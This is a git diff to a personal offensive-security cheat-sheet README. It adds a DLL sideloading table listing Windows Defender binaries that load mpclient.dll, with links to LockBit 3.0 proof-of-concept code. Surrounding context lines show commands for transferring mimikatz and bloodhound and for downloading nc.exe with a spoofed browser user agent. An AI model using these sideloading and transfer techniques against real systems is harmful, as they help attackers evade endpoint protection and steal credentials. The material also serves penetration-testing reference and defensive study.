@@ -81,6 +81,7 @@ This is my personal safe for arsenals. Feel free to refer and use at anytime. Yo
 	* [Certifried](#certifried)
 * **[Relay Notes](#relay-notes)**
 * **[File Transfer](#file-transfer)**
+* **[DLL Sideloading](#dll-sideload)**
 * **[Reverse Shells](#reverse-shells)**
 	* [php](#php-reverse-shell)
 	* [perl](#perl-reverse-shell)
@@ -1115,6 +1116,14 @@ For the details explanation of the vulnerability (CVE-2022-26923), you may read 
 | `scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip` | Upload a file using SCP |
 | `scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe` | Download a file using SCP |
 | `Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"` | Invoke-WebRequest using a Chrome User Agent |
+
+# DLL Sideloading
+These are all some of my personal favorite sideloading tricks collected from various platforms. 
+
+| Binary | Location | Reference DLL | Export Function |
+|-------|---------|----------|-----|
+|NisSrv.exe|`C:\Program Files\Windows Defender\NisSrv.exe`|mpclient.dll|[Source](https://raw.githubusercontent.com/Sh0ckFR/Lockbit3.0-MpClient-Defender-PoC/main/dllmain-NisSrv.cpp)|
+|MpCmdRun.exe|`C:\Program Files\Windows Defender\MpCmdRun.exe`|mpclient.dll|[Source](https://raw.githubusercontent.com/Sh0ckFR/Lockbit3.0-MpClient-Defender-PoC/main/dllmain-mpcmdrun.cpp)|
 
 # Reverse Shells
 _Credits: These reverse shells examples are reffered to [EzpzShell](https://github.com/H0j3n/EzpzShell) by [@h0j3n](https://twitter.com/h0j3n)_
